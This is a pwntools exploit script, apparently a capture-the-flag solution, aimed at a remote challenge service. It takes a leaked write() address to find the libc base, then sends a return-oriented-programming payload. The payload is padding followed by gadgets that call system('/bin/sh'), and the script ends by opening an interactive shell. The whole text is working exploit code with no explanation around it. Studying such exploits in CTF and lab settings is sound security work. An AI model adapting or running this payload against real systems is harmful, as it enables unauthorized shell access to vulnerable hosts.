from pwn import *


#sh = process('./player/poj')
sh = remote("challenge.bugpwn.com",1003)
libc = ELF('./player/libc.so.6',checksec=False)

pop_rax_ret = 0x0000000000040647
pop_rdi_jmp_rax = 0x000000000002b003
  
  
sh.recvline()
sh.recvuntil(b'Write() address : ')
libc.address = int(sh.recvuntil(b'\n'),16) - libc.sym['write']

payload = b"A"*72
payload += p64(libc.address + pop_rax_ret)
payload += p64(libc.sym['system'])
payload += p64(libc.address + pop_rdi_jmp_rax)
payload += p64(next(libc.search(b'/bin/sh')))
  
sh.send(payload)
sh.interactive()
